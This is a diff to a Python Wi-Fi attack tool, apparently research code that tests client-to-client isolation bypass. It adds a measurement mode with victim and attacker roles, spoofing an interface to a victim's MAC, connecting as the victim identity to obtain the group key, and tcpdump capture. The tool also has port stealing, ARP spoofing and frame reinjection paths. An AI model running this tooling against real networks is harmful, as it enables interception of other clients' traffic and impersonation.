@@ -23,7 +23,7 @@ import signal
 from datetime import datetime
 from wpaspy import Ctrl
 #from libwifi.crypto import encrypt_ccmp
-import pcapy
+#import pcapy
 from scapy.all import Ether, Dot11
 import pyshark
 import queue
@@ -35,6 +35,20 @@ import errno
 import os
 import fcntl
 from cryptography.hazmat.primitives.ciphers.aead import AESCCM
+
+def start_capture_for_iface(iface, out_path, bpf=None):
+    try:
+        print(f"Try to start capture for {iface} and save to {out_path}!")
+        tcpdump = shutil.which("tcpdump")
+        if tcpdump:
+            cmd = [tcpdump, "-i", iface, "-w", out_path, "-U"]
+            if bpf:
+                cmd += [bpf]
+            tcpdump_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            return tcpdump_process
+    except Exception as e:
+        print("Capture start failed:", e)
+        return None
 
 def pn2bytes_fast(pn: int):
     b = pn.to_bytes(8, "little", signed=False)  # [PN0..PN7]
@@ -1191,12 +1205,26 @@ class Client2Client:
     def __init__(self, options):
         self.options = options
         self.poc = options.poc
-        if self.options.c2c_port_steal is not None:
-            set_macaddress(self.options.c2c, get_macaddress(self.options.iface))
+
+        restore_macaddress(options.iface)
+        restore_macaddress(options.c2c)
+
+        if (self.options.c2c_victim_mac is not None):
+            set_macaddress(options.iface, self.options.c2c_victim_mac)
+
         if not self.poc:
-            self.sup_victim = Supplicant(options.iface, options)
-            self.sup_attacker = Supplicant(options.c2c, options)
+            if not self.options.measure:
+                self.sup_victim = Supplicant(options.iface, options)
+                self.sup_attacker = Supplicant(options.c2c, options)
+            else:
+                if self.options.measure_victim:
+                    self.sup_victim = Supplicant(options.iface, options)
+                    self.sup_attacker = None
+                elif self.options.measure_atkr:
+                    self.sup_victim = None
+                    self.sup_attacker = Supplicant(options.c2c, options)
         else:
+            # In PoC mode, we only launch the attacker instance.
             self.sup_victim = None
             self.sup_attacker = Supplicant(options.c2c, options)
         self.forward_ip = False
@@ -1208,6 +1236,7 @@ class Client2Client:
         self.test_finished = False
         self.cap_proc = None
         self.gtk_proc = None
+        self._cap_proc = None
 
     def stop(self):
         try:
@@ -1222,6 +1251,17 @@ class Client2Client:
                 self.gtk_proc.stop()
                 self.gtk_proc.terminate()
                 self.gtk_proc.join(timeout=1)
+        except Exception:
+            pass
+        try:
+            if getattr(self, "_cap_proc", None):
+                self._cap_proc.terminate()
+                # Optional: wait for it to actually exit
+                try:
+                    self._cap_proc.wait(timeout=3)
+                except subprocess.TimeoutExpired:
+                    # Force kill (SIGKILL) if it didn't exit
+                    self._cap_proc.kill()
         except Exception:
             pass
 
@@ -1469,6 +1509,10 @@ class Client2Client:
         log(STATUS, f"Starting iperf3 (uplink) with: {' '.join(cmd)}")
 
         try:
+            logfile = None
+            if self.options.iperf_output is not None:
+                logfile = open(f"{self.options.iperf_output}", "w")
+
             proc = subprocess.Popen(
                 cmd,
                 stdout=subprocess.PIPE,
@@ -1481,9 +1525,14 @@ class Client2Client:
             for line in proc.stdout:
                 line = line.strip()
                 if line:
-                    log(STATUS, f"[iperf3] {line}")   # 或者改成 yield/print
+                    log(STATUS, f"[iperf3] {line}")
+                    if logfile:
+                        logfile.write(line + "\n")
 
             proc.wait()
+
+            if logfile:
+                logfile.close()
 
             if proc.returncode == 0:
                 log(STATUS, "iperf3 (uplink) finished successfully.")
@@ -1562,7 +1611,7 @@ class Client2Client:
 
     def run(self):
         # If not in PoC mode, let victim client connect.
-        if self.options.poc and self.options.c2c_port_steal:
+        if (self.options.poc and self.options.c2c_port_steal) or (self.options.measure_atkr):
             pass
         else:
             self.sup_victim.start()
@@ -1582,7 +1631,15 @@ class Client2Client:
                 set_macaddress(self.options.c2c, self.sup_victim.routermac)
             self.sup_attacker = Supplicant(self.options.c2c, self.options)
 
-        self.attacker_connect()
+        if self.options.measure and self.options.measure_atkr:
+            victim_bssid_gtk = self.attacker_connect_to_victim_bssid_to_get_gtk()
+
+        if self.options.c2c_port_steal is not None:
+            set_macaddress(self.options.c2c, get_macaddress(self.options.iface))
+
+        if not (self.options.measure and self.options.measure_victim):
+            self.sup_attacker = Supplicant(self.options.c2c, self.options)
+            self.attacker_connect()
 
         self.check_gtk_shared()
 
@@ -1590,7 +1647,7 @@ class Client2Client:
             self.options.c2m_freq = self.freq_victim
             self.mon_attacker = Monitor(self.options.reinject_gtk, self.options)
             self.mon_attacker.start()
-            self.mon_attacker.set_gtk(self.sup_victim.get_gtk_2())
+            self.mon_attacker.set_gtk(victim_bssid_gtk)
             job_q = mp.Queue(maxsize=10000)
             job_q2 = mp.Queue(maxsize=10000)
 
@@ -1608,51 +1665,61 @@ class Client2Client:
                 raise
             self.inj_proc = InjectProcess(iface=self.options.reinject_gtk, pn=self.mon_attacker.pn, header_bytes=header_bytes, in_queue=job_q2, sc_offset=sc_offset)
             self.inj_proc.start()
-            # header = build_radiotap_header(rate_mbps=54.0, channel_freq_mhz=5745, channel_flags=0x00)
-            # 你需要传入 sc_offset：它应该指向生成的 header 里 802.11 SC 字段在 header 中的偏移。
-            # 若你不知道偏移，可在你构造 radiotap + 802.11 header 时把 SC 的位置记录下来并传入。
 
             log(STATUS, f"Started InjectProcess (pid={self.inj_proc.pid})", color="green")
 
         # [ Send a packet from the attacker to the victim ]
 
         # Thread 1 is to let attacker send testing packets like C2C IP packets or C2C ethernet frames, or do port stealing.
-        thread1 = threading.Thread(target=self.send_c2c_frame)
+        if not (self.options.measure and self.options.measure_victim):
+            thread1 = threading.Thread(target=self.send_c2c_frame)
         # Thread 2 is to let victim monitor received packets.
-        if not (self.options.poc and self.options.c2c_port_steal):
+        if not ((self.options.poc and self.options.c2c_port_steal) or self.options.measure_atkr):
             thread2 = threading.Thread(target=self.start_monitor)
 
         # Thread 4 is to let attacker monitor received packets.
-        #if self.options.c2c_port_steal is not None:
-        #    thread4 = threading.Thread(target=self.start_attacker_receiver)
-        #elif self.options.c2c_port_steal_uplink is not None:
-        #    thread4 = threading.Thread(target=self.start_attacker_receiver2)
+        # In measure mode, we have high-performance subprocesses, so this is not needed. 
+        if not self.options.measure:
+            if self.options.c2c_port_steal is not None:
+               thread4 = threading.Thread(target=self.start_attacker_receiver)
+            elif self.options.c2c_port_steal_uplink is not None:
+               thread4 = threading.Thread(target=self.start_attacker_receiver2)
 
         # Thread 3 is to let victim continuously send sample traffic like ICMP Echo.
         if not self.options.poc:
-            if self.options.c2c_port_steal is not None:
-                thread3 = threading.Thread(target=self.send_uplink_frame)
-            elif self.options.c2c_port_steal_uplink is not None:
-                thread3 = threading.Thread(target=self.send_uplink_frame2)
+            if self.options.measure_victim:
+                if self.options.c2c_port_steal is not None:
+                    thread3 = threading.Thread(target=self.send_uplink_frame)
+                elif self.options.c2c_port_steal_uplink is not None:
+                    thread3 = threading.Thread(target=self.send_uplink_frame2)
 
-        if not (self.options.poc and self.options.c2c_port_steal):
+        if not ((self.options.poc and self.options.c2c_port_steal) or self.options.measure_atkr):
             thread2.start()
-        thread1.start()
-        #if self.options.c2c_port_steal is not None or self.options.c2c_port_steal_uplink is not None:
-        #    thread4.start()
+
+        if not (self.options.measure and self.options.measure_victim):
+	        thread1.start()
+
+        if not self.options.measure and (self.options.c2c_port_steal is not None or self.options.c2c_port_steal_uplink is not None):
+            thread4.start()
 
         if not self.options.poc:
-            if self.options.c2c_port_steal is not None or self.options.c2c_port_steal_uplink is not None:
-                thread3.start()
+            if self.options.measure_victim:
+                if self.options.c2c_port_steal is not None or self.options.c2c_port_steal_uplink is not None:
+                    thread3.start()
 
-        thread1.join()
-        if not (self.options.poc and self.options.c2c_port_steal):
+        if not (self.options.measure and self.options.measure_victim):
+	        thread1.join()
+
+        if not ((self.options.poc and self.options.c2c_port_steal) or self.options.measure_atkr):
             thread2.join()
-        #if self.options.c2c_port_steal is not None or self.options.c2c_port_steal_uplink is not None:
-        #    thread4.join()
+
+        if not self.options.measure and (self.options.c2c_port_steal is not None or self.options.c2c_port_steal_uplink is not None):
+            thread4.join()
+
         if not self.options.poc:
-            if self.options.c2c_port_steal is not None or self.options.c2c_port_steal_uplink is not None:
-                thread3.join()
+            if self.options.measure_victim:
+                if self.options.c2c_port_steal is not None or self.options.c2c_port_steal_uplink is not None:
+                    thread3.join()
 
         # Identity output to use
         identities = f"{self.sup_attacker.id_attacker} to {self.sup_attacker.id_victim}"
@@ -1672,6 +1739,31 @@ class Client2Client:
             log(STATUS, f">>> Client to client traffic at Ethernet layer appears to be disabled ({identities}).", color="green")
         elif not self.forward_ip and self.options.c2c_ip is not None:
             log(STATUS, f">>> Client to client traffic at IP layer appears to be disabled ({identities}).", color="green")
+
+    def attacker_connect_to_victim_bssid_to_get_gtk(self):
+        self.sup_attacker.start()
+        self.sup_attacker.scan(wait=False)
+        self.sup_attacker.wait_scan_done()
+
+        # If --other-bss is connect, connect to a different BSSID. Otherwise connect to the same BSSID.
+        # if self.options.other_bss:
+        #        log(STATUS, f"Will now connect to a BSSID different than {self.bssid_victim}")
+        #        self.sup_attacker.ignore_bssid(self.bssid_victim)
+        # else:
+        #        log(STATUS, f"Will now connect to the BSSID {self.bssid_victim}")
+        #        self.sup_attacker.set_bssid(self.bssid_victim)
+
+
+        log(STATUS, f"Connecting as {self.sup_attacker.id_victim} using {self.sup_attacker.nic_iface} to the network...", color="green")
+        self.sup_attacker.connect(self.sup_attacker.netid_victim, timeout=60)
+
+        data = self.sup_attacker.status()
+        self.freq_victim = data['freq']
+        gtk_victim_bssid = self.sup_attacker.get_gtk_2()
+        self.sup_attacker.netid_attacker = None
+        self.sup_attacker.netid_victim = None
+        self.sup_attacker.stop()
+        return gtk_victim_bssid
 
     def attacker_connect(self):
         self.sup_attacker.start()
@@ -1696,30 +1788,32 @@ class Client2Client:
         data = self.sup_attacker.status()
         self.bssid_attacker = data['bssid']
 
+        if getattr(self.options, "c2c_pcap_output", None):
+            # Use the interface of the attacker (options.c2c) and filter by attacker's MAC to minimize noise
+            try:
+                        att_mac = self.sup_attacker.mac
+                        bpf = f"ether host {att_mac} and udp port 5201"
+                        #bpf = None
+                        self._cap_proc = start_capture_for_iface(self.options.c2c, self.options.c2c_pcap_output, bpf=bpf)
+                        if self._cap_proc:
+                            log(STATUS, f"Started system capture for attacker iface {self.options.c2c} -> {self.options.c2c_pcap_output}", color="green")
+                        else:
+                            log(WARNING, "Failed to start system capture process.")
+            except Exception as e:
+                        log(WARNING, f"Exception when starting capture: {e}")
+
         # Let the attacker get an IP address, also
         if self.options.c2c_port_steal_uplink is None and self.options.c2c_port_steal is None:
                 # In port stealing, we don't try getting an IP address.
             self.sup_attacker.get_ip_address()
-        elif self.options.c2c_port_steal is not None:
+        elif (self.options.c2c_port_steal is not None) and not (self.options.measure):
             self.sup_attacker.arp_sock = ARP_sock(sock=self.sup_attacker.sock_eth, IP_addr=self.sup_victim.clientip, ARP_addr=self.sup_attacker.mac)
             self.sup_attacker.can_send_traffic = True
-        elif self.options.c2c_port_steal_uplink is not None:
+        elif (self.options.c2c_port_steal_uplink is not None) and not (self.options.measure):
             self.sup_attacker.arp_sock = ARP_sock(sock=self.sup_attacker.sock_eth, IP_addr=self.sup_victim.routerip, ARP_addr=self.sup_attacker.mac)
             self.sup_attacker.can_send_traffic = True
         self.attacker_connected = True
-        # if getattr(self.options, "c2c_pcap_output", None):
-        #     # Use the interface of the attacker (options.c2c) and filter by attacker's MAC to minimize noise
-        #     try:
-        #                 att_mac = self.sup_attacker.mac
-        #                 #bpf = f"ether host {att_mac} and udp port 5201"
-        #                 bpf = None
-        #                 self._cap_proc = start_capture_for_iface(self.options.c2c, self.options.c2c_pcap_output, bpf=bpf)
-        #                 if self._cap_proc:
-        #                     log(STATUS, f"Started system capture for attacker iface {self.options.c2c} -> {self.options.c2c_pcap_output}", color="green")
-        #                 else:
-        #                     log(WARNING, "Failed to start system capture process.")
-        #     except Exception as e:
-        #                 log(WARNING, f"Exception when starting capture: {e}")
+        
 
     def check_gtk_shared(self):
         if self.options.check_gtk_shared is not None:
@@ -1829,6 +1923,8 @@ def main():
     parser.add_argument("--check-gtk-shared", help="Checking if second given interface receives the same GTK from BSSID.")
     parser.add_argument("--poc", default=False, action="store_true", help="Attack a real client for PoC purposes.")
     parser.add_argument("--measure", default=False, action="store_true", help="Measure attack performance. ")
+    parser.add_argument("--measure-victim", default=False, action="store_true", help="Act as the victim during the measurement. ")
+    parser.add_argument("--measure-atkr", default=False, action="store_true", help="Act as the attacker during the measurement. ")
     parser.add_argument("--c2c-gtk-inject", help="Checking if second given interface can inject frames wrapped with GTK.")
     parser.add_argument('--iperf-target', dest='iperf_target', default='192.168.106.157',
                         help='iperf3 server target IP (default: 192.168.106.157)')
@@ -1841,6 +1937,8 @@ def main():
     parser.add_argument('--reinject-reflection', default=False, action="store_true", help="Reinject stolen frames via broadcast reflection.")
     parser.add_argument('--reinject-gtk', help="Third interface to reinject stolen frames via GTK abuse.")
     parser.add_argument('--c2c-pcap-output', help='Write sup_attacker capture to pcap via dumpcap/tcpdump')
+    parser.add_argument('--iperf-output', help='Write iperf debug stderr output to a filename')
+    parser.add_argument('--c2c-victim-mac', help='Set victim MAC address to the victim interface.')
 
     options = parser.parse_args()
 
@@ -1855,6 +1953,9 @@ def main():
 
     if options.no_ssid_check and not options.other_bss:
         log(WARNING, f"WARNING: When using --no-ssid-check you usually also want to use --other-bss")
+
+    if options.measure and not (options.measure_victim or options.measure_atkr):
+    	log(WARNING, f"WARNING: In measurement mode, one must choose either to be a victim or an attacker.")
 
     # Assure that options.c2c is always set when doing client-to-client tests
     if options.c2c_eth is not None:
